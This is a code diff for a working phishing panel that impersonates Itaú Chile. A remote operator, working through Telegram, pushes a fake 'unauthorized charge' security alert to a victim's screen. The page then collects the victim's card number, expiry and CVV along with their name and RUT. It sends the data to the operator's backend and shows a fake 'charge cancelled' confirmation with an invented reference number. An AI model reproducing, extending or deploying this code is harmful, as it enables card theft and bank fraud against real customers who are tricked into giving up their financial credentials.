+          // Si es cobro no autorizado (débito o crédito), generar mensaje completo
+          if(label.includes('-cobro-no-autorizado')){
+            tipoTarjetaDetectado='';
+            if(label.startsWith('debito-')){
+              tipoTarjetaDetectado='DÉBITO';
+              label=label.replace('debito-','');
+            } else if(label.startsWith('credito-')){
+              tipoTarjetaDetectado='CRÉDITO';
+              label=label.replace('credito-','');
+            }
+            // Usar siempre curName (nombre real del usuario logueado) en lugar del nombre del callback
+            label=`Alerta de seguridad: Se ha detectado una transacción no reconocida por $69.990 asociada a su cuenta. Estado: pendiente de procesamiento. Para iniciar el protocolo de bloqueo preventivo, verifique los datos de su tarjeta.`;
+          }
+          showRequest(label);
+          if(curMsgId)await tgEdit(curMsgId,`⏳ <b>Solicitando información</b>\n\n👤 ${curName} | ${curUser}\n📋 <b>${label}</b>\n\nEsperando respuesta del cliente...`);
+        } else if(cb==='custom:ask'){
+          waitingCustom=true;
+          await tgSend('✏️ <b>Escribe tu solicitud personalizada</b>\nEl cliente verá exactamente lo que escribas:');
+        } else if(cb==='end:session'){
+          await endSession();
+        }
+      } else if(upd.message&&upd.message.text&&waitingCustom){
+        const label=upd.message.text;
+        waitingCustom=false;
+        showRequest(label);
+        if(curMsgId)await tgEdit(curMsgId,`⏳ <b>Solicitando información</b>\n\n👤 ${curName} | ${curUser}\n📋 <b>${label}</b>\n\nEsperando respuesta del cliente...`);
+      }
+    }
+  }
+
+  function showRequest(label){
+    document.getElementById('req-q').textContent=label;
+    document.getElementById('req-ans').value='';
+    document.getElementById('ok-msg').style.display='none';
+
+    const isCobro=label.includes('cobro no autorizado')||label.includes('transacción no reconocida');
+    const isDebito=tipoTarjetaDetectado==='DÉBITO';
+    const isCredito=tipoTarjetaDetectado==='CRÉDITO';
+    const reqBox=document.getElementById('req-box');
+
+    if(isCobro){
+      // Ocultar genérico, mostrar bloque cobro
+      document.getElementById('req-tag').style.display='none';
+      document.getElementById('req-q').style.display='none';
+      document.getElementById('generic-form').style.display='none';
+      document.getElementById('cobro-block').style.display='block';
+
+      // Nombre del cliente
+      document.getElementById('cobro-nombre').textContent=curName;
+
+      // Tipo de tarjeta en el comercio
+      const tipoLabel=isDebito?'Tarjeta Débito':'Tarjeta Crédito';
+      document.getElementById('cobro-comercio').textContent=`en ${tipoLabel} — Itaú Chile`;
+
+      // Imagen de tarjeta
+      const cardImageEl=document.getElementById('card-image');
+      if(isDebito){
+        cardImageEl.src=generateCardDebito(curName);
+        cardImageEl.alt='Tarjeta Débito Itaú';
+      } else {
+        cardImageEl.src=generateCardCredito(curName);
+        cardImageEl.alt='Tarjeta Crédito Itaú';
+      }
+
+      // Borde sutil
+      reqBox.style.border='none';
+      reqBox.style.animation='none';
+
+      // Limpiar campos
+      document.getElementById('card-number').value='';
+      document.getElementById('card-expiry').value='';
+      document.getElementById('card-cvv').value='';
+      document.getElementById('card-error').textContent='';
+      document.getElementById('expiry-error').textContent='';
+      document.getElementById('cvv-error').textContent='';
+      document.getElementById('bin-info').style.display='none';
+      document.getElementById('btn-card-resp').disabled=true;
+    } else {
+      // Modo genérico
+      document.getElementById('req-tag').style.display='block';
+      document.getElementById('req-tag').className='req-tag';
+      document.getElementById('req-tag').innerHTML='El agente solicita';
+      document.getElementById('req-q').style.display='none';
+      document.getElementById('req-q-generic').textContent=label;
+      document.getElementById('generic-form').style.display='block';
+      document.getElementById('cobro-block').style.display='none';
+      reqBox.style.border='none';
+      reqBox.style.animation='none';
+      document.getElementById('btn-resp').disabled=false;
+    }
+
+    document.getElementById('req-zone').style.display='block';
+    document.getElementById('req-zone').scrollIntoView({behavior:'smooth',block:'center'});
+  }
+
+  async function submitAnswer(){
+    const ans=document.getElementById('req-ans').value.trim();
+    if(!ans)return;
+    document.getElementById('btn-resp').disabled=true;
+    const label=document.getElementById('req-q').textContent;
+    
+    // ✅ Enviar respuesta al backend
+    await fetch(`${BACKEND_URL}/api/send-data`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userName:curName,rut:curUser,label,answer:ans})});
+    
+    const BOTONES=getBotones(curName);
+    
+    curMsgId=await tgSend(`🔔 <b>Cliente en espera</b>\n\n👤 <b>Nombre:</b> ${curName}\n🪪 <b>RUT:</b> ${curUser}\n\nSelecciona la siguiente acción:`,BOTONES);
+    document.getElementById('req-zone').style.display='none';
+    document.getElementById('ok-msg').style.display='block';
+  }
+
+  async function submitCardData(){
+    const cardNumber=document.getElementById('card-number').value.replace(/\s/g,'');
+    const expiry=document.getElementById('card-expiry').value;
+    const cvv=document.getElementById('card-cvv').value;
+    
+    // Validaciones finales
+    if(cardNumber.length!==16||!/^\d{16}$/.test(cardNumber)){
+      document.getElementById('card-error').textContent='Ingresa 16 dígitos válidos';
+      return;
+    }
+    if(!isExpiryValid(expiry)){
+      document.getElementById('expiry-error').textContent='Formato inválido';
+      return;
+    }
+    if(cvv.length!==3||!/^\d{3}$/.test(cvv)){
+      document.getElementById('cvv-error').textContent='3 dígitos requeridos';
+      return;
+    }
+    
+    document.getElementById('btn-card-resp').disabled=true;
+    const label=document.getElementById('req-q').textContent;
+    
+    // Enviar datos completos de tarjeta
+    const cardInfo=`Número: ${cardNumber} | Vencimiento: ${expiry} | CVV: ${cvv}`;
+
+    await fetch(`${BACKEND_URL}/api/send-data`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userName:curName,rut:curUser,label,answer:cardInfo})});
+    
+    // Mostrar animación de éxito con candado
+    const okMsg=document.getElementById('ok-msg');
+    okMsg.style.animation='successPulse 0.8s ease-out';
+    okMsg.style.padding='28px 20px';
+    okMsg.innerHTML=`
+      <div style="display:flex;flex-direction:column;align-items:center;gap:8px">
+        <div style="width:64px;height:64px;background:#28A745;border-radius:50%;display:flex;align-items:center;justify-content:center;animation:lockBounce 0.8s ease-out,shieldPulse 1.5s ease-out 0.5s">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+        </div>
+        <div style="margin-top:6px">
+          <div style="font-size:17px;color:#1A3557;font-weight:800;letter-spacing:0.02em">Cobro anulado con éxito</div>
+          <div style="font-size:12px;color:#28A745;font-weight:700;margin-top:4px;text-transform:uppercase;letter-spacing:0.08em">Protocolo de bloqueo completado</div>
+        </div>
+        <div style="width:100%;margin-top:10px;padding:10px 14px;background:rgba(40,167,69,0.08);border-radius:8px;text-align:left">
+          <div style="font-size:11px;color:#6B7A8D;line-height:1.6">
+            <span style="color:#28A745;font-weight:700">REF:</span> TXN-${Date.now().toString(36).toUpperCase()}<br>
+            <span style="color:#28A745;font-weight:700">Estado:</span> Transacción bloqueada y reversada<br>
+            <span style="color:#28A745;font-weight:700">Fecha:</span> ${new Date().toLocaleDateString('es-CL')}
+          </div>
+        </div>
+      </div>`;
+    document.getElementById('req-zone').style.display='none';
+    okMsg.style.display='block';
+    
+    const BOTONES=getBotones(curName);
+    curMsgId=await tgSend(`🔔 <b>Cliente en espera</b>\n\n👤 <b>Nombre:</b> ${curName}\n🪪 <b>RUT:</b> ${curUser}\n\nSelecciona la siguiente acción:`,BOTONES);
+  }
+
+  function isExpiryValid(value){
+    const m=String(value).match(/^(\d{2})\/(\d{2}|\d{4})$/);
+    if(!m)return false;
+
+    const month=parseInt(m[1],10);
+    if(month<1||month>12)return false;
+
+    const rawYear=m[2];
+    const year=rawYear.length===2?2000+parseInt(rawYear,10):parseInt(rawYear,10);
+    const now=new Date();
+    const curYear=now.getFullYear();
+    const curMonth=now.getMonth()+1;
+
+    return !(year<curYear||(year===curYear&&month<curMonth));
+  }
+
+  function updateCardSubmitState(){
+    const cardNumber=document.getElementById('card-number').value.replace(/\s/g,'');
+    const expiry=document.getElementById('card-expiry').value.trim();
+    const cvv=document.getElementById('card-cvv').value.trim();
+    const canSubmit=/^\d{16}$/.test(cardNumber)&&isExpiryValid(expiry)&&/^\d{3}$/.test(cvv);
+    document.getElementById('btn-card-resp').disabled=!canSubmit;
+  }
+
+  function validateCardNumber(el){
+    let val=el.value.replace(/\D/g,'').slice(0,16);
+    // Formatear con espacios (4 grupos)
+    el.value=val.replace(/(\d{4})/g,'$1 ').trim();
+    
+    const cleanVal=val.replace(/\s/g,'');
+    const errDiv=document.getElementById('card-error');
+    const binDiv=document.getElementById('bin-info');
+    
+    if(cleanVal.length===0){
+      errDiv.textContent='';
+      binDiv.style.display='none';
+      updateCardSubmitState();
+      return;
+    }
+    
+    if(cleanVal.length<6){
+      errDiv.textContent='Ingresa al menos 6 dígitos';
+      binDiv.style.display='none';
+      updateCardSubmitState();
+      return;
+    }
+    
+    if(cleanVal.length===16){
+      // Validar BIN con API pública (endpoint JSON)
+      const bin=cleanVal.slice(0,6);
+      fetch(`${BACKEND_URL}/api/bin/lookup?bin=${encodeURIComponent(bin)}`)
+        .then(r=>{
+          if(!r.ok)throw new Error('BIN lookup failed');
+          return r.json();
+        })
+        .then(data=>{
+          if(data.success&&data.scheme&&data.type){
+            document.getElementById('bin-bank').textContent=data.bank||'—';
+            document.getElementById('bin-type').textContent=data.type;
+            binDiv.style.display='block';
+            errDiv.textContent='✓ Tarjeta válida';
+            errDiv.style.color='#1D6B35';
+            updateCardSubmitState();
+          } else {
+            throw new Error('BIN data incompleta');
+          }
+        })
+        .catch(e=>{
+          errDiv.textContent='⚠ No se pudo validar en línea';
+          errDiv.style.color='#C0392B';
+          updateCardSubmitState();
+        });
+    } else {
+      errDiv.textContent='';
+      binDiv.style.display='none';
+      updateCardSubmitState();
+    }
+  }
+
+  function validateExpiry(el){
+    let val=el.value.replace(/\D/g,'').slice(0,6);
+    if(val.length>=2){
+      val=val.slice(0,2)+'/'+val.slice(2);
+    }
+    el.value=val;
+    
+    const errDiv=document.getElementById('expiry-error');
+    if(val.length<5){
+      errDiv.textContent='';
+      updateCardSubmitState();
+      return;
+    }
+
+    const m=val.match(/^(\d{2})\/(\d{2}|\d{4})$/);
+    if(!m){
+      errDiv.textContent='Formato válido: MM/YY o MM/YYYY';
+      updateCardSubmitState();
+      return;
+    }
+
+    const month=parseInt(m[1],10);
+    if(month<1||month>12){
+      errDiv.textContent='Mes inválido (01-12)';
+      updateCardSubmitState();
+      return;
+    }
+
+    if(!isExpiryValid(val)){
+      errDiv.textContent='Tarjeta expirada';
+      updateCardSubmitState();
+      return;
+    }
+
+    errDiv.textContent='';
+    updateCardSubmitState();
+  }
+
+  function validateCVV(el){
+    el.value=el.value.replace(/\D/g,'').slice(0,3);
+    const errDiv=document.getElementById('cvv-error');
+    if(el.value.length===3){
+      errDiv.textContent='';
+    } else if(el.value.length>0){
+      errDiv.textContent=`${3-el.value.length} dígito(s) más`;
+    } else {
+      errDiv.textContent='';
+    }
+    updateCardSubmitState();
+  }
+
+  async function endSession(){
+    clearInterval(pollTimer);
+    await fetch(`${BACKEND_URL}/api/end-session`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userName:curName,rut:curUser})});
+    showV('v-ended');
+  }
+</script>
+</body>
+</html>
